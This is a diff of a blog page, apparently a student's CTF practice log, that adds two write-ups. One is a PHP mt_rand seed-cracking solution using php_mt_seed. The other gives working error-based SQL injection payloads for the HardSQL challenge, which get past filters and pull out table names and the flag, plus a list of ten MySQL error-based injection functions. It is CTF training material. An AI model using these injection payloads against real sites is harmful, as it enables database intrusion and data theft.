@@ -97,8 +97,20 @@
 <meta property="og:image" content="https://i.loli.net/2021/01/12/KbxzFBj6M7adSGm.png">
 <meta property="og:image" content="https://i.loli.net/2021/01/12/FxA6fmstJRy4dK1.png">
 <meta property="og:image" content="https://i.loli.net/2021/01/13/WwCku1RMVsdAPI8.png">
-<meta property="og:image" content="https://i.loli.net/2021/01/13/i5qwduj9Vfko1YN.png">
-<meta property="og:updated_time" content="2021-01-13T10:38:25.180Z">
+<meta property="og:image" content="https://i.loli.net/2021/01/14/x8DmpyH452TlakC.png">
+<meta property="og:image" content="https://i.loli.net/2021/01/14/Kuwxg1ofsTdV9WI.png">
+<meta property="og:image" content="https://i.loli.net/2021/01/13/3DYUHOhNkdM862W.png">
+<meta property="og:image" content="https://i.loli.net/2021/01/14/OJdbi2PIDCGuUYq.png">
+<meta property="og:image" content="https://i.loli.net/2021/01/14/JHdtuBIy72gipjn.png">
+<meta property="og:image" content="https://i.loli.net/2021/01/14/zA2VyeRTUQHEiIO.png">
+<meta property="og:image" content="https://i.loli.net/2021/01/14/fpcINsh9ZyKXgVP.png">
+<meta property="og:image" content="https://i.loli.net/2021/01/14/MXgDKYI4SNCoLiT.png">
+<meta property="og:image" content="https://i.loli.net/2021/01/14/lCxvQr1HV42pOF8.png">
+<meta property="og:image" content="https://i.loli.net/2021/01/14/ypix3XkH1Nc7Gwm.png">
+<meta property="og:image" content="https://i.loli.net/2021/01/14/l8H3vJfcneDSCRw.png">
+<meta property="og:image" content="https://i.loli.net/2021/01/14/5j1tVEkunLWd8gA.png">
+<meta property="og:image" content="https://i.loli.net/2021/01/14/U6LYBpoODh7ISrk.png">
+<meta property="og:updated_time" content="2021-01-14T03:58:14.091Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="BUU刷题记录">
 <meta name="twitter:description" content="​    考研初试已经结束，不管考的怎么样，要开始准备复试了，遂重新刷BUU，记录下做题过程。">
@@ -326,7 +338,7 @@
                   <span class="post-meta-item-text">Words count in article&#58;</span>
                 
                 <span title="Words count in article">
-                  2.3k 字
+                  2.9k 字
                 </span>
               
 
@@ -342,7 +354,7 @@
                   <span class="post-meta-item-text">Reading time &asymp;</span>
                 
                 <span title="Reading time">
-                  9 分钟
+                  12 分钟
                 </span>
               
             </div>
@@ -489,10 +501,80 @@
 <p><img src="https://i.loli.net/2021/01/13/WwCku1RMVsdAPI8.png" alt="image-20210113181832863"></p>
 <p>这里用到了php伪随机的种子爆破，利用网上的c语言脚本：<a href="https://www.openwall.com/php_mt_seed/" target="_blank" rel="noopener">php_mt_seed</a></p>
 <p>逆向题目中的加密函数，使符合脚本的输入规范</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">str1=<span class="string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br><span class="line">str2=<span class="string">'A5rgiREesS'</span></span><br><span class="line">str3 = str1[::<span class="number">-1</span>]</span><br><span class="line">length = len(str2)</span><br><span class="line">res=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str2)):</span><br><span class="line">    <span class="keyword">if</span> i&lt;=length/<span class="number">2</span>:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">            <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">                res+=str(j)+<span class="string">' '</span>+str(j)+<span class="string">' '</span>+<span class="string">'0'</span>+<span class="string">' '</span>+str(len(str1)<span class="number">-1</span>)+<span class="string">' '</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">str1=<span class="string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br><span class="line">str2=<span class="string">'A5rgiREesS'</span></span><br><span class="line">str3 = str1[::<span class="number">-1</span>]</span><br><span class="line">length = len(str2)</span><br><span class="line">res=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str2)):</span><br><span class="line">    <span class="keyword">if</span> i&lt;=length/<span class="number">2</span>:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">            <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">                res+=str(j)+<span class="string">' '</span>+str(j)+<span class="string">' '</span>+<span class="string">'0'</span>+<span class="string">' '</span>+str(len(str1)<span class="number">-1</span>)+<span class="string">' '</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">print(res)</span><br><span class="line"><span class="comment">#36 36 0 61 31 31 0 61 17 17 0 61 6 6 0 61 8 8 0 61 53 53 0 61 40 40 0 61 4 4 0 61 18 18 0 61 54 54 0 61</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://i.loli.net/2021/01/13/i5qwduj9Vfko1YN.png" alt="image-20210113183815239"></p>
+<p><img src="https://i.loli.net/2021/01/14/x8DmpyH452TlakC.png" alt="微信截图_20210113184021"></p>
 <p>用脚本爆破种子</p>
+<p><img src="https://i.loli.net/2021/01/14/Kuwxg1ofsTdV9WI.png" alt="QQ截图20210113184233"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./php_mt_seed 36 36 0 61 31 31 0 61 17 17 0 61 6 6 0 61 8 8 0 61 53 53 0 61 40 40 0 61 4 4 0 61 18 18 0 61 54 54 0 61</span><br><span class="line"><span class="comment">#961723226</span></span><br></pre></td></tr></table></figure>
+
+<p>将种子代入原函数得到字符串</p>
+<p><img src="https://i.loli.net/2021/01/13/3DYUHOhNkdM862W.png" alt="QQ截图20210113184329"></p>
+<p>php_my_seed使用方法：<a href="https://www.cnblogs.com/zaqzzz/p/9997855.html" target="_blank" rel="noopener">https://www.cnblogs.com/zaqzzz/p/9997855.html</a></p>
+<p>参考文章：</p>
+<ul>
+<li><a href="https://xz.aliyun.com/t/3656#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/3656#toc-3</a></li>
+<li><a href="https://www.freebuf.com/vuls/192012.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/192012.html</a></li>
+</ul>
+<h1 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h1><p>考点：报错注入</p>
+<p>XPATH报错；过滤了空格，等号，and</p>
+<p>爆数据库</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&amp;password=admin'^extractvalue(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">database</span>())),<span class="number">0x7e</span>))%<span class="number">23</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># geek</span></span><br></pre></td></tr></table></figure>
+
+<p>爆表名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&amp;password=admin'^(extractvalue(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(table_name))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema)<span class="keyword">like</span>(<span class="string">'geek'</span>)),<span class="number">0x7e</span>)))%<span class="number">23</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># H4rDsq1</span></span><br></pre></td></tr></table></figure>
+
+<p>爆列名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&amp;password=admin'or(extractvalue(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(column_name))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(table_name)<span class="keyword">like</span>(<span class="string">'H4rDsq1'</span>)),<span class="number">0x7e</span>)))%<span class="number">23</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># id,username,password</span></span><br></pre></td></tr></table></figure>
+
+<p>爆字段</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&amp;password=admin'or(extractvalue(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">password</span>)<span class="keyword">from</span>(H4rDsq1)),<span class="number">0x7e</span>)))%<span class="number">23</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;731351f9-6bb1-4cef-acb7-1c</span></span><br></pre></td></tr></table></figure>
+
+<p>由于只有一半 所以我们用 left()和right() 函数来爆后面的字段</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&amp;password=admin'or(extractvalue(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">right</span>(<span class="keyword">password</span>,<span class="number">30</span>))<span class="keyword">from</span>(H4rDsq1)),<span class="number">0x7e</span>)))%<span class="number">23</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 9-6bb1-4cef-acb7-1ceb55c45a02&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>最后得到flag：flag{731351f9-6bb1-4cef-acb7-1ceb55c45a02}</p>
+<p>注：“^” 在 sql 语句中是异或的作用也可以换成 or；由于过滤了空格可以使用()绕过；过滤了“=”可以使用 like 绕过；由于是 XPATH 报错我们可以使用 extractvalue()或者updatexml()报错注入</p>
+<h2 id="十种报错函数"><a href="#十种报错函数" class="headerlink" title="十种报错函数"></a>十种报错函数</h2><p>1.floor()</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="keyword">user</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/01/14/OJdbi2PIDCGuUYq.png" alt="1016026-20160928204840594-1429421338"></p>
+<p>2.extractvalue()</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>)));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/01/14/JHdtuBIy72gipjn.png" alt="1016026-20160928205421297-407989251"></p>
+<p>3.updatexml()</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/01/14/zA2VyeRTUQHEiIO.png" alt="1016026-20160928205451969-1920882857"></p>
+<p>4.geometrycollection()</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> geometrycollection((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/01/14/fpcINsh9ZyKXgVP.png" alt="1016026-20160928205719485-521701933"></p>
+<p>5.multipoint()</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> multipoint((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/01/14/MXgDKYI4SNCoLiT.png" alt="1016026-20160928205942266-563740245"></p>
+<p>6.polygon()</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> polygon((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/01/14/lCxvQr1HV42pOF8.png" alt="1016026-20160928205828281-760176387"></p>
+<p>7.multipolygon()</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> multipolygon((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/01/14/ypix3XkH1Nc7Gwm.png" alt="1016026-20160928210038094-1420034123"></p>
+<p>8.linestring()</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> linestring((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/01/14/l8H3vJfcneDSCRw.png" alt="1016026-20160928210144438-1099086559"></p>
+<p>9.multilinestring()</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> multilinestring((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/01/14/5j1tVEkunLWd8gA.png" alt="1016026-20160928210420750-344279412"></p>
+<p>10.exp()</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">exp</span>(~(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/01/14/U6LYBpoODh7ISrk.png" alt="1016026-20160928210533313-2028104812"></p>
 
       
     </div>
@@ -673,7 +755,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#强网杯-2019-随便注"><span class="nav-number">1.</span> <span class="nav-text">[强网杯 2019]随便注</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#方法一：更改表名和列名"><span class="nav-number">1.1.</span> <span class="nav-text">方法一：更改表名和列名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#方法二：绕过select限制"><span class="nav-number">1.2.</span> <span class="nav-text">方法二：绕过select限制</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#方法三：使用handler绕过"><span class="nav-number">1.3.</span> <span class="nav-text">方法三：使用handler绕过</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#RoarCTF-2019-Easy-Calc"><span class="nav-number">2.</span> <span class="nav-text">[RoarCTF 2019]Easy Calc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#方法一：PHP特性"><span class="nav-number">2.1.</span> <span class="nav-text">方法一：PHP特性</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#方法二：HTTP走私"><span class="nav-number">2.2.</span> <span class="nav-text">方法二：HTTP走私</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#HTTP走私原理"><span class="nav-number">2.2.1.</span> <span class="nav-text">HTTP走私原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HTTP走私的四种方法"><span class="nav-number">2.2.2.</span> <span class="nav-text">HTTP走私的四种方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#CL不为0时"><span class="nav-number">2.2.2.1.</span> <span class="nav-text">CL不为0时</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CL-CL"><span class="nav-number">2.2.2.2.</span> <span class="nav-text">CL-CL</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CL-TE"><span class="nav-number">2.2.2.3.</span> <span class="nav-text">CL-TE</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#TE-CL"><span class="nav-number">2.2.2.4.</span> <span class="nav-text">TE-CL</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#网鼎杯-2020-青龙组-AreUSerialz"><span class="nav-number">3.</span> <span class="nav-text">[网鼎杯 2020 青龙组] AreUSerialz</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#GWCTF-2019-枯燥的抽奖"><span class="nav-number">4.</span> <span class="nav-text">[GWCTF 2019]枯燥的抽奖</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#强网杯-2019-随便注"><span class="nav-number">1.</span> <span class="nav-text">[强网杯 2019]随便注</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#方法一：更改表名和列名"><span class="nav-number">1.1.</span> <span class="nav-text">方法一：更改表名和列名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#方法二：绕过select限制"><span class="nav-number">1.2.</span> <span class="nav-text">方法二：绕过select限制</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#方法三：使用handler绕过"><span class="nav-number">1.3.</span> <span class="nav-text">方法三：使用handler绕过</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#RoarCTF-2019-Easy-Calc"><span class="nav-number">2.</span> <span class="nav-text">[RoarCTF 2019]Easy Calc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#方法一：PHP特性"><span class="nav-number">2.1.</span> <span class="nav-text">方法一：PHP特性</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#方法二：HTTP走私"><span class="nav-number">2.2.</span> <span class="nav-text">方法二：HTTP走私</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#HTTP走私原理"><span class="nav-number">2.2.1.</span> <span class="nav-text">HTTP走私原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HTTP走私的四种方法"><span class="nav-number">2.2.2.</span> <span class="nav-text">HTTP走私的四种方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#CL不为0时"><span class="nav-number">2.2.2.1.</span> <span class="nav-text">CL不为0时</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CL-CL"><span class="nav-number">2.2.2.2.</span> <span class="nav-text">CL-CL</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CL-TE"><span class="nav-number">2.2.2.3.</span> <span class="nav-text">CL-TE</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#TE-CL"><span class="nav-number">2.2.2.4.</span> <span class="nav-text">TE-CL</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#网鼎杯-2020-青龙组-AreUSerialz"><span class="nav-number">3.</span> <span class="nav-text">[网鼎杯 2020 青龙组] AreUSerialz</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#GWCTF-2019-枯燥的抽奖"><span class="nav-number">4.</span> <span class="nav-text">[GWCTF 2019]枯燥的抽奖</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#极客大挑战-2019-HardSQL"><span class="nav-number">5.</span> <span class="nav-text">[极客大挑战 2019]HardSQL</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#十种报错函数"><span class="nav-number">5.1.</span> <span class="nav-text">十种报错函数</span></a></li></ol></li></ol></div>
             
 
           </div>
